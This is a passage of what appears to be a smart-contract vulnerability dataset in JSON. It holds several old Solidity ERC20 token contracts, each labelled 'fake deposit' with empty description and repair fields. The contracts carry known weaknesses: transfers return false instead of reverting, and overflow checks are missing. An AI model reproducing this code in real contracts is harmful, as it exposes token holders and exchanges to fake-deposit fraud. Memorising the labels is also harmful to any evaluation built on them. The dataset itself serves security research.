true;\r\n } else { return false; }\r\n }\r\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n balances[_to] += _value;\r\n balances[_from] -= _value;\r\n allowed[_from][msg.sender] -= _value;\r\n Transfer(_from, _to, _value);\r\n return true;\r\n } else { return false; }\r\n }\r\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\r\n return balances[_owner];\r\n }\r\nfunction approve(address _spender, uint256 _value) returns (bool success) {\r\n allowed[msg.sender][_spender] = _value;\r\n Approval(msg.sender, _spender, _value);\r\n return true;\r\n }\r\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n return allowed[_owner][_spender];\r\n }\r\nmapping (address => uint256) balances;\r\n mapping (address => mapping (address => uint256)) allowed;\r\n uint256 public totalSupply;\r\n}\r\ncontract ERC20Token is StandardToken {\r\nfunction () {\r\n //if ether is sent to this address, send it back.\r\n throw;\r\n }\r\n/* Public variables of the token */\r\n string public name = \"Rainbow Token\"; //Name of the token\r\n uint8 public decimals = 18; //How many decimals to show. ie. There could 1000 base units with 3 decimals\r\n string public symbol =\"RNBO\"; //An identifier: eg AXM\r\n string public version = \"H1.1\"; //human 0.1 standard. Just an arbitrary versioning scheme.\r\n//\r\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\r\n//\r\n//make sure this function name matches the contract name above. So if you\u2019re token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\nfunction ERC20Token(\r\n ) {\r\n balances[msg.sender] = 450000000000000000000000000000000; // Give the creator all initial tokens (100000 for example)\r\n totalSupply = 900000000000000000000000000000000; // Update total supply (100000 for example)\r\n name = \"Rainbow Token\"; // Set the name for display purposes\r\n decimals = 18; // Amount of decimals\r\n symbol = \"RNBO\"; // Set the symbol for display purposes\r\n }\r\n/* Approves and then calls the receiving contract */\r\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n allowed[msg.sender][_spender] = _value;\r\n Approval(msg.sender, _spender, _value);\r\n//call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn\u2019t have to include a contract in here just for this.\r\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n return true;\r\n }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.16;\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 810000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 810000000;                        // Update total supply (100000 for example)\r\n        name = \"Drone\";                                   // Set the name for display purposes\r\n        decimals = 6;                            // Amount of decimals for display purposes\r\n        symbol = \"DRONE\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.16;\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'v1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n    address owner;\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 100000000000;               \r\n        totalSupply = 100000000000;                      \r\n        name = \"NFT Marketplace DCART\";                                   \r\n        decimals = 4;                           \r\n        symbol = \"DCART\";                              \r\n        owner = msg.sender;\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 10000000000000000;\t// Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 10000000000000000000;\t\t// Update total supply (100000 for example)\r\n        name = \"VISA\";\t\t\t\t\t// Set the name for display purposes\r\n        decimals = 10;\t\t\t\t\t// Amount of decimals for display purposes\r\n        symbol = \"VISA\";\t\t\t\t// Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Coin {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardCoin is Coin {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract BeautyCoin is StandardCoin {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        \r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H0.1';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function BeautyCoin(\r\n        ) {\r\n        balances[msg.sender] = 12000000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 12000000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"BeautyCoin\";                                   // Set the name for display purposes\r\n        decimals = 12;                            // Amount of decimals for display purposes\r\n        symbol = \"BCN\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) {  }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n/// @return total amount of tokens\r\nfunction totalSupply() constant returns (uint256 supply) {}\r\n\r\n/// @param _owner The address from which the balance will be retrieved\r\n/// @return The balance\r\nfunction balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n/// @notice send `_value` token to `_to` from `msg.sender`\r\n/// @param _to The address of the recipient\r\n/// @param _value The amount of token to be transferred\r\n/// @return Whether the transfer was successful or not\r\nfunction transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n/// @notice send `_value` token to `_to` from `_from` on the condition it is approvedby `_from`\r\n/// @param _from The address of the sender\r\n/// @param _to The address of the recipient\r\n/// @param _value The amount of token to be transferred\r\n/// @return Whether the transfer was successful or not\r\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n/// @param _spender The address of the account able to transfer the tokens\r\n\r\n/// @param _value The amount of wei to be approved for transfer\r\n/// @return Whether the approval was successful or not\r\nfunction approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n/// @param _owner The address of the account owning tokens\r\n/// @param _spender The address of the account able to transfer the tokens\r\n/// @return Amount of remaining tokens allowed to spent\r\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\r\nevent Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n}\r\n\r\ncontract StandardToken is Token {\r\n\r\nfunction transfer(address _to, uint256 _value) returns (bool success) {\r\n//Default assumes totalSupply can&#39;t be over max (2^256 - 1).\r\n//If your token leaves out totalSupply and can issue more tokens as time goes on,\r\n//you need to check if it doesn&#39;t wrap.\r\n//Replace the if with this one instead.\r\n//if (balances[msg.sender] &gt;= _value &amp;&amp; balances[_to] + _value &gt; balances[_to]) {\r\n    if (balances[msg.sender] >= _value && _value >  0) {\r\n        balances[msg.sender] -= _value;\r\n        balances[_to] += _value;\r\n\r\n        Transfer(msg.sender, _to, _value);\r\n    return true;\r\n    } else { return false; }\r\n}\r\n\r\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n//same as above. Replace this line with the following if you want to protect againstwrapping uints.\r\n//if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n        return true;\r\n        } else { return false; }\r\n}\r\n\r\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\r\n    return balances[_owner];\r\n}\r\n\r\nfunction approve(address _spender, uint256 _value) returns (bool success) {\r\n\r\n    allowed[msg.sender][_spender] = _value;\r\n    emit Approval(msg.sender, _spender, _value);\r\n    return true;\r\n}\r\n\r\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n    return allowed[_owner][_spender];\r\n}\r\n\r\nmapping (address => uint256) balances;\r\nmapping (address => mapping (address => uint256)) allowed;\r\nuint256 public totalSupply;\r\n\r\n    \r\n}\r\n\r\n//name this contract whatever you&#39;d like\r\ncontract AghettoCoin is StandardToken {\r\n\r\nfunction () { //if ether is sent to this address, send it back.\r\nthrow;\r\n}\r\n\r\n/* Public variables of the token */\r\n\r\n/*\r\nNOTE:\r\nThe following variables are OPTIONAL vanities. One does not have to include them.\r\nThey allow one to customise the token contract &amp; in no way influences the core\r\nfunctionality.\r\nSome wallets/interfaces might not even bother to look at this information.\r\n*/\r\nstring public name; //fancy name: eg Simon Bucks\r\nuint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It&#39;s like comparing 1 wei to 1 ether.\r\nstring public symbol; //An identifier: eg SBX\r\nstring public version = '1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you&#39;re token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\nfunction ERC20Token() {\r\n    balances[msg.sender] = 100000000000000; // Give the creator all initial tokens (100000 for example)\r\n    totalSupply = 100000000000000; // Update total supply (100000 forexample)\r\n    name = \"AghettoCoin\"; // Set the name for display purposes\r\n\r\n    decimals = 5; // Amount of decimals for display purposes\r\n    symbol = \"AGTC\"; // Set the symbol for display purposes\r\n}\r\n\r\n/* Approves and then calls the receiving contract */\r\nfunction approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n\r\n    allowed[msg.sender][_spender] = _value;\r\n    Approval(msg.sender, _spender, _value);\r\n\r\n    //call the receiveApproval function on the contract you want to be notified. Thiscrafts the function signature manually so one doesn&#39;t have to include a contract in here just for this.\r\n    //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes_extraData)\r\n    //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n\r\n    if(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n    return true;\r\n    \r\n    \r\n}\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
